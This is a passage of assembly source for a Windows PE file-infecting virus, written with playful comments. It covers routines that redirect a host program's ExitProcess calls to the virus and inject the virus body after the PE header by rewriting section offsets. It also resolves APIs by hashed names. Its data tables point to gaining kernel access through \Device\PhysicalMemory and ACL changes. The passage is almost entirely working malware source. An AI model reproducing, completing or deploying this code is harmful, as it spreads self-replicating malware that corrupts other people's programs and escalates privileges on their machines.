                                jnz IMAGE_THUNK_DATANoExitProcess

                                mov ecx,esi

                                xchg edx,eax
                                ; Takes ESI=PEHeader, EDX=RVA and returns EDX=Physical Offset in file
                                call ConvertRVAToPhysicalOffset
                                test edx,edx    ; we check errors
                                jnz PointerToImportNameOK       ; if not, continue

                                pop edx ; if there was an error ( the imported symbolïs name is unreachable -wrong RVA- )
ErrorWrongThunkArrayRVA:        pop edx ; we balance the stack ( we have 2 DWORDs on the stack or 1 DWORD if we came from jz ErrorWrongThunkArrayRVA above )

                                jmp ErrorInfectingFile  ; and we exit

PointerToImportNameOK:          xchg edx,eax

                                lea esi,[eax+ebx+IMAGE_IMPORT_BY_NAME.Name1]    ; To skip first two bytes ( hint )
                                call GetStringsCRC32
                                mov esi,ecx

                                cmp eax,CRC32OfExitProcess
                                jz EndOfIMAGE_THUNK_DATAs

IMAGE_THUNK_DATANoExitProcess:  add edx,4
                                jmp FindExitProcessIMPORT

EndOfIMAGE_THUNK_DATAs:         pop eax ; as we said before this loop, we now substract starting address of the array to the pointer
                                sub edx,eax     ; so we obtain the offset into first thunk array ;)
                                xchg edx,eax

                                pop edx ; we restore Kernel32ïs IMPORT_IMAGE_DESCRIPTOR too :D

                                test ecx,ecx    ; If we didnt find ExitProcess import, we cant infect, so we exit ;(
                                jz ErrorInfectingFile

                                add eax,[edx+IMAGE_IMPORT_DESCRIPTOR.FirstThunk]        ; we add first thunk array base to the offset into first thunk array
                                add eax,[esi+IMAGE_NT_HEADERS.OptionalHeader.ImageBase] ; and we add the image base too
                                mov [ebp+AddressOfExitProcessIntoIAT],eax       ; and the resulting address will be the address in memory where ExitProcess address will reside in the IAT ( Import Address Table )
                                                                                ; this will allow us to find every JMP/CALL [ExitProcess] };> into executableïs code section
                                mov edx,[esi+IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint]
                                test edx,edx    ; no Entry Point Address in PE file ?
                                jz ErrorInfectingFile   ; bad bad bad, better to exit

                                call GetRVAsSectionHeader       ; we obtain the section header of code section ( the section where AddressOfEntryPoint falls )

                                test edx,edx    ; cant find? ok, exit
                                jz ErrorInfectingFile

                                mov ecx,[edx+IMAGE_SECTION_HEADER.SizeOfRawData]        ; we are going to look for FF 15/25 XX XX XX XX ( where XX is ExitProcess importïs address into IAT )
                                mov edx,[edx+IMAGE_SECTION_HEADER.PointerToRawData]     ; so we need code sections size and location ( file offset)

                                lea edx,[edx+ebx+2]     ; This +2 is cos a FF 15 EX IT PR OC or FF 25 EX IT PR OC has
                                                        ; 2 bytes before the DWORD of AddressOfExitProcessIntoIAT.
                                add ecx,edx     ; we add location to the size, cos we are goind to use it as an ending limit

                                mov eax,[ebp+AddressOfExitProcessIntoIAT]       ; EAX is what we will seek ;D ( ExitProcess importïs address into IAT )

                                push 0  ; we will store a counter for the patches made here,
                                        ; so if we havent patched anything, then ErrorInfectingFile ;(
FindNextBranchToExitProcess:    cmp [edx],eax   ; Is this the DWORD we are looking for ? ( address of ExitProcess into IAT )
                                jnz IsNotABranchToExitProcess

                                cmp [edx-2],word 25FFh  ; yes, but is it a FF 25 > JMP DWORD [ExitProcess] ?
                                jz BranchToExitProcessFound
                                cmp [edx-2],word 15FFh  ; or a FF 15 > CALL DWORD [ExitProcess] ?
                                jnz IsNotABranchToExitProcess

BranchToExitProcessFound:       inc dword [esp] ; we increment change counter in that case 

                                mov [edx-2],byte 68h    ; PUSH DWORD ( so that in becomes push VirusAddress ;) )
                                mov [edx+3],byte 0C3h   ; RET
                                push eax
                                mov eax,[esi+IMAGE_NT_HEADERS.OptionalHeader.ImageBase] ; Virus address in memory: ImageBase+SizeOfHeader
                                add eax,[esi+IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders]     ; cos we will inject virusïs code after the original header :P
                                mov [edx-1],eax ; and we put it next to the 68h ( 68h XXXXXXXXh > PUSH DWORD > PUSH VirusAddress )
                                pop eax

                                add edx,3       ; should be +4 but we increment edx by next instruction ;D ( this is to skip checking next 4 bytes since we already know they wont match )

IsNotABranchToExitProcess:      inc edx
                                cmp edx,ecx     ; did we reach the limit ?
                                jc FindNextBranchToExitProcess  ; if not, keep going :D

                                pop ecx ; number of changes made ( instances found )
                                jecxz ErrorInfectingFile        ; ==0 ? ok, exit

                                xor eax,eax
                                mov ah,(Virus_size_physical/256)        ; mov eax,Virus_size_physical

                                movzx ecx,word [esi+IMAGE_NT_HEADERS.FileHeader.NumberOfSections]       ; ECX=Number of sections

                                movzx edx,word [esi+IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
                                lea edx,[esi+edx+IMAGE_FILE_HEADER_size+4]    ; +4 for the PE,0,0 signature size

                                ; EDX=Address of the SECTION_HEADERs array that we are going to update
                                ; each non bss section will have its PointerToRawData updated ( +=Virus_size_physical > cos we shifted that amount of bytes between original header end and first sectionïs data, so all sectionsï pointer to raw data need to be "displaced" )

                                push eax        ; This is just to reserve a space where we will store last ( non bss ) sectionïs PointerToRawData+SizeOfRawData ( righteous EXE size )

UpdateIMAGE_SECTION_HEADERs:    cmp [edx+IMAGE_SECTION_HEADER.PointerToRawData],dword 0
                                jz DontUpdateIMAGE_SECTION_HEADER       ; if it is a bss section, dont add displacement ;)

                                xchg [esp],eax  

                                mov eax,[edx+IMAGE_SECTION_HEADER.PointerToRawData]     ; with this we will remember
                                add eax,[edx+IMAGE_SECTION_HEADER.SizeOfRawData]        ; last non bss sectionïs offset+size ( righteous size that the exe should have )

                                xchg [esp],eax

                                add [edx+IMAGE_SECTION_HEADER.PointerToRawData],eax     ; add displacement :)

DontUpdateIMAGE_SECTION_HEADER: add edx,IMAGE_SECTION_HEADER_size       ; advance to next section header
                                dec ecx ; and go on till we finish all the sections
                                jnz UpdateIMAGE_SECTION_HEADERs

                                pop ecx ; bring back the righteous exe size ( last non bss sectionïs offset+size )

                                cmp edi,ecx     ; Is there an overlay in the EXE file ? ( last ( non bss ) sectionïs PointerToRawData+SizeOfRawData != fileïs size )
                                jnz ErrorInfectingFile   ; if there is, exit :|

                                mov ecx,[esi+IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders]     ; we need to move the whole original header backwards, ECX is the amount of bytes to move

                                add [esi+IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders],eax     ; the new header will be enlarged, cos it needs to count on virus size too };

                                lea edx,[edi+eax]       ; new size of the file: Previous file size+virus size

                                shr ecx,2       ; we are moving by DWORDs, so we divide ECX by 4

                                mov esi,ebx     ; remember EBX has file contentïs address
                                mov edi,ebx     ; so ESI takes EBXïs value and edi takes EBXïs value minus Virus size
                                sub edi,eax     ; so we will inject the virus just in between :))
                                rep movsd       ; and we do the moving

                                mov ecx,eax     ; we now have to fiiiinaaaally move or inject our virus :DD
                                shr ecx,2       ; so we move virus size / 4 amount of DWORDs
                                mov esi,ebp     ; remember our mighty friend DeltaHandle ? we will read from it too, ooohhh we overabuse its usage ( little kiss for you DH :* ) xDDD
                                rep movsd       ; moveeeee! ( inject )

                                mov esi,ebx     ; the code piece that calls us expects us to return with ESI=offset from where to write to file and EDI=new file size ( or bytes that will be written to the file ).
                                sub esi,eax     ; Previous file contentïs address minus virus size ( we displaced that amount of bytes backwards cos we needed the space to inject virus code )

                                mov edi,edx     ; so as we said, EDI takes EDX, that had previous files size+virus size ( new file size )
                                pop ebx ; we restore ebx, cos we where supposed to preserve it O:)

                                ret

ErrorInfectingFile:             xor edi,edi     ; ooooppsss :S, what happened ? :( well just mark error by EDI=0 and exit
                                pop ebx ; we restore ebx for the same reason

                                ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ROUTINES

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; ESI < PE HEADER
;; EDX < RVA
;; EDX > PHYSICAL OFFSET OF THE RVA INTO THE FILE OR 0 IF ERROR.
ConvertRVAToPhysicalOffset:     push eax

                                push edx
                                call GetRVAsSectionHeader
                                pop eax

                                test edx,edx
                                jz ErrorGettingRVAsSectionHeader

                                sub eax,[edx+IMAGE_SECTION_HEADER.VirtualAddress]
                                add eax,[edx+IMAGE_SECTION_HEADER.PointerToRawData]
                                xchg edx,eax

ErrorGettingRVAsSectionHeader:  pop eax

                                ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; ESI < PE HEADER
;; EDX < RVA
;; EDX > SECTION HEADER OF THE SECTION WHERE THE RVA IS OR 0 IF ERROR.
GetRVAsSectionHeader:           push eax
                                push ebx
                                push ecx

                                movzx ecx,word [esi+IMAGE_NT_HEADERS.FileHeader.NumberOfSections]

                                movzx ebx,word [esi+IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader]
                                lea ebx,[esi+ebx+IMAGE_FILE_HEADER_size+4]    ; +4 for the PE,0,0 signature size

RVAsSectionSearchLoop:          mov eax,[ebx+IMAGE_SECTION_HEADER.VirtualAddress]

                                cmp edx,eax
                                jc NoRVAsSection

                                add eax,[ebx+IMAGE_SECTION_HEADER.SizeOfRawData]
                                cmp edx,eax
                                jc RVAsSectionFound

NoRVAsSection:                  add ebx,IMAGE_SECTION_HEADER_size
                                dec ecx
                                jnz RVAsSectionSearchLoop

                                cdq     ; set edx=0 to indicate error
                                jmp RVAsSectionNotFound

RVAsSectionFound:               mov edx,ebx

RVAsSectionNotFound:            pop ecx
                                pop ebx
                                pop eax

                                ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; EBX < CLUE ( ADDRESS ABOVE THE BASE ) 
;; EAX < ALIGNMENT
;; EBX > MODULE BASE
SolveModuleBase:                dec eax
                                not eax

                                and ebx,eax

                                not eax
                                inc eax

TryNextModuleBaseChance:        cmp [ebx],word IMAGE_DOS_SIGNATURE
                                jz ModuleBaseFound
                                sub ebx,eax
                                jmp TryNextModuleBaseChance

ModuleBaseFound:                ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; ESI < STRING
;; EAX > CRC32
GetStringsCRC32:                push edx
                                push ecx
                                push esi

                                xor edx,edx

CRC32SumUpLoop:                 lodsd
                                mov ecx,eax

                                test cl,cl
                                jz CRC32End1

                                test ch,ch
                                jz CRC32End2

                                shr ecx,16

                                test cl,cl
                                jz CRC32End3

                                test ch,ch
                                jz CRC32End4

                                add edx,eax

                                jmp CRC32SumUpLoop

CRC32End2:                      and eax,000000FFh
CRC32End3:                      and eax,0000FFFFh
CRC32End4:                      and eax,00FFFFFFh
                                add edx,eax
CRC32End1:                      xchg edx,eax

                                pop esi
                                pop ecx
                                pop edx

                                ret

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; EBX < MODULE BASE
;; EDI < ARRAY THAT WILL WE FILLED WITH SOLVED ADDRESSES 
;; ESI < 0 TERMINATED CRC32 CHAIN OF THE EXPORTS TO IMPORT
SolveModuleExports:             push edi
                                push edx
                                push ecx
                                push eax

                                mov edx,[ebx+IMAGE_DOS_HEADER.e_lfanew]
                                mov edx,[ebx+edx+IMAGE_NT_HEADERS.OptionalHeader.DataDirectory+IMAGE_DATA_DIRECTORY_size*IMAGE_DIRECTORY_ENTRY_EXPORT+IMAGE_DATA_DIRECTORY.VirtualAddress]
                                add edx,ebx

SolveNextExport:                xor ecx,ecx

                                cmp [esi],ecx
                                jz ExportChainEnd

TryNextExportChance:            push esi

                                mov esi,[edx+IMAGE_EXPORT_DIRECTORY.AddressOfNames]
                                lea eax,[ebx+ecx*4]
                                mov esi,[esi+eax]
                                add esi,ebx

                                call GetStringsCRC32

                                pop esi

                                cmp [esi],eax
                                jz CurrentExportFound

                                inc ecx

                                jmp TryNextExportChance

CurrentExportFound:             push esi

                                mov esi,[edx+IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
                                lea eax,[ebx+ecx*2]
                                movzx eax,word [esi+eax]

                                mov esi,[edx+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
                                lea ecx,[ebx+eax*4]
                                mov eax,[esi+ecx]
                                add eax,ebx

                                stosd

                                pop esi

                                lodsd   ; just an ESI+=4

                                jmp SolveNextExport

ExportChainEnd:                 pop eax
                                pop ecx
                                pop edx
                                pop edi

                                ret


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; DATA

OBJ_CASE_INSENSITIVE            equ 00000040h

GRANT_ACCESS			equ 1 
NO_INHERITANCE			equ 0

TRUSTEE_IS_NAME			equ 1
TRUSTEE_IS_USER			equ 1
NO_MULTIPLE_TRUSTEE		equ 0

SE_KERNEL_OBJECT		equ 6

NonPagedPool                    equ 0
PagedPool                       equ 1

FILE_SYNCHRONOUS_IO_NONALERT    equ 00000020h
FILE_NON_DIRECTORY_FILE         equ 00000040h

FileStandardInformation         equ 5


CRC32OfExitProcess              equ 'Exit'+'Proc'+'ess'


; APIsï CRC32 Chains

KERNEL32ApiCRC32s:
                                dd 'SetT'+'hrea'+'dPri'+'orit'+'y'
                                dd 'Loca'+'lFre'+'e'
                                dd 'Clos'+'eHan'+'dle'
                                dd 'Virt'+'ualL'+'ock'
                                dd 'Virt'+'ualU'+'nloc'+'k'
                                dd 'Slee'+'p'
                                dd 'Load'+'Libr'+'aryA'
                                dd 0

ADVAPI32ApiCRC32s:
                                dd 'GetS'+'ecur'+'ityI'+'nfo'
                                dd 'SetS'+'ecur'+'ityI'+'nfo'
                                dd 'SetE'+'ntri'+'esIn'+'AclA'
                                dd 0

NTDLLApiCRC32s:
                                dd 'NtOp'+'enSe'+'ctio'+'n'
                                dd 'NtMa'+'pVie'+'wOfS'+'ecti'+'on'
                                dd 'NtUn'+'mapV'+'iewO'+'fSec'+'tion'
                                dd 0

NTOSKRNLApiCRC32s:
                                dd 'ExAl'+'loca'+'tePo'+'olWi'+'thTa'+'g'
                                dd 'ExFr'+'eePo'+'ol'
                                dd 'KeSe'+'rvic'+'eDes'+'crip'+'torT'+'able'
                                dd 'NtOp'+'enFi'+'le'
                                dd 'ZwOp'+'enFi'+'le'
                                dd 'ZwCl'+'ose'
                                dd 'ZwQu'+'eryI'+'nfor'+'mati'+'onFi'+'le'
                                dd 'ZwRe'+'adFi'+'le'
                                dd 'ZwWr'+'iteF'+'ile'
                                dd 0

align 512,db 0    ; Just to align virus size to 512 byte boundary ;D
Virus_size_physical             equ $-Virus

; Resolved API Addresses

KERNEL32ApiCalls:
SetThreadPriority               dd 0
LocalFree                       dd 0
CloseHandle                     dd 0
VirtualLock                     dd 0
VirtualUnlock                   dd 0
Sleep                           dd 0
LoadLibraryA                    dd 0

ADVAPI32ApiCalls:
GetSecurityInfo                 dd 0
SetSecurityInfo                 dd 0
SetEntriesInAclA                dd 0

NTDLLApiCalls:
NtOpenSection                   dd 0
NtMapViewOfSection              dd 0
NtUnmapViewOfSection            dd 0

NTOSKRNLApiCalls:
ExAllocatePoolWithTag           dd 0
ExFreePool                      dd 0
KeServiceDescriptorTable        dd 0
NtOpenFile                      dd 0
ZwOpenFile                      dd 0
ZwClose                         dd 0
ZwQueryInformationFile          dd 0
ZwReadFile                      dd 0
ZwWriteFile                     dd 0

;;; TYPE DECLARATIONS FOR USED STRUCTS

xstruc UNICODE_STRING
	xitemw Length
	xitemw MaximumLength
	xitemd Buffer
xends

xstruc OBJECT_ATTRIBUTES
        xitemd Length
	xitemd RootDirectory
	xitemd ObjectName
	xitemd Attributes
	xitemd SecurityDescriptor
	xitemd SecurityQualityOfService
xends

%macro TRUSTEE 1-3 1,0
xstruc %1,%2,%3
	xitemd pMultipleTrustee
	xitemd MultipleTrusteeOperation
	xitemd TrusteeForm
	xitemd TrusteeType
	xitemd ptstrName
xends
%endmacro
TRUSTEE TRUSTEE

xstruc EXPLICIT_ACCESS
	xitemd grfAccessPermissions
	xitemd grfAccessMode
	xitemd grfInheritance
	TRUSTEE Trustee
xends

xstruc GDTR
        xitemw Limit
        xitemd Base
xends

xstruc IDTR
        xitemw Limit
        xitemd Base
xends

xstruc FILE_STANDARD_INFORMATION
        xitemq AllocationSize
        xitemq EndOfFile
        xitemd NumberOfLinks
        xitemd DeletePending
        xitemd Directory
xends

;;;

;;; DATA SPACE DECLARATIONS

; Some of theese strucs need to be on a DWORD boundary!
; So EBP should also de aligned to DWORD on runtime!
; Also, for size optimization, theese next 3 structs + 2 strings are filled dinamically on runtime and need to be one after another

MyOBJECT_ATTRIBUTES:
xistruc OBJECT_ATTRIBUTES
        ;xat Length,dd OBJECT_ATTRIBUTES_size
        ;xat RootDirectory,dd 0
        ;xat ObjectName,dd MyUNICODE_STRING > this will take effective address [ebp+MyUNICODE_STRING]
        ;xat Attributes,dd OBJ_CASE_INSENSITIVE
        ;xat SecurityDescriptor,dd NULL
        ;xat SecurityQualityOfService,dd NULL
xiends

MyUNICODE_STRING:
xistruc UNICODE_STRING
        ;xat Length,dw DevicePhysicalMemory_size
        ;xat MaximumLength,dw DevicePhysicalMemory_size
        ;xat Buffer,dd DevicePhysicalMemory > this will take effective address [ebp+DevicePhysicalMemory]
xiends

MyEXPLICIT_ACCESS:
xistruc EXPLICIT_ACCESS
        ;xat grfAccessPermissions,dd SECTION_MAP_WRITE
        ;xat grfAccessMode,dd GRANT_ACCESS
        ;xat grfInheritance,dd NO_INHERITANCE
        ;xat Trustee.pMultipleTrustee,dd NULL
        ;xat Trustee.MultipleTrusteeOperation,dd NO_MULTIPLE_TRUSTEE
        ;xat Trustee.TrusteeForm,dd TRUSTEE_IS_NAME
        ;xat Trustee.TrusteeType,dd TRUSTEE_IS_USER
        ;xat Trustee.ptstrName,dd CURRENTUSER > this will take effective address [ebp+CURRENTUSER]
xiends

;;;

align 4,db 0    ; Some of theese strucs need to be on a DWORD boundary!
                ; So EBP should also de aligned to DWORD on runtime!
                ; NOTE: This string will be dinamically replaced in runtime so its
                ; purpose is just to reserve a space and to be more understandable
CURRENTUSER                     db 'CURRENT_USER',0

align 4,db 0    ; Some of theese strucs need to be on a DWORD boundary!
                ; So EBP should also de aligned to DWORD on runtime!
                ; NOTE: This string will be dinamically replaced in runtime so its
                ; purpose is just to reserve a space and to be more understandable
DevicePhysicalMemory            db '\',0,'D',0,'e',0,'v',0,'i',0,'c',0,'e',0,'\',0,'P',0,'h',0,'y',0,'s',0,'i',0,'c',0,'a',0,'l',0,'M',0,'e',0,'m',0,'o',0,'r',0,'y',0
DevicePhysicalMemory_size       equ $-DevicePhysicalMemory

                dw 0    ; needed just cos the loop that fills previous DevicePhysicalMemory fills in a WORD more that the needed ( loop optimization reason )
;;;

MyGDTR:
xistruc GDTR
xiends

MyIDTR:
xistruc IDTR
xiends

MyhSection			dd 0
pDacl				dd 0
pSecurityDescriptor		dd 0
pNewAcl				dd 0

KERNEL32Base                    dd 0


align 256,db 0  ; Just to align virus virtual size to 256 byte boundary ;D
Virus_size_memory               equ $-Virus

;--8<-------------------------------------------------------------------------

; * * *  END OF DOCUMENT * * *
